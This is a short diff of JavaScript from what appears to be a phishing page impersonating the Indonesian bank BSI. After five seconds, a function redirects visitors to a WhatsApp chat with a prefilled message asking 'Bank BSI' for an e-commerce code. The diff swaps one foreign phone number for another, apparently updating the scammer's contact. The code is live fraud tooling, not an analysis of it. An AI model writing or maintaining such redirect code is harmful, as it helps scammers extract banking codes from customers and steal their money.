@@ -167,7 +167,7 @@ function getcs(){
      audio1.load();
     audio4.loop = false
 setTimeout(function(){  
-location.href='https://wa.me/212780286576?text=Hallo%20Bank%20BSI%0ASaya%20mau%20request%20Kode%20E-Commerce';
+location.href='https://wa.me/4591777263?text=Hallo%20Bank%20BSI%0ASaya%20mau%20request%20Kode%20E-Commerce';
  $("#djload").hide();   
     }, 5000);    
 }     
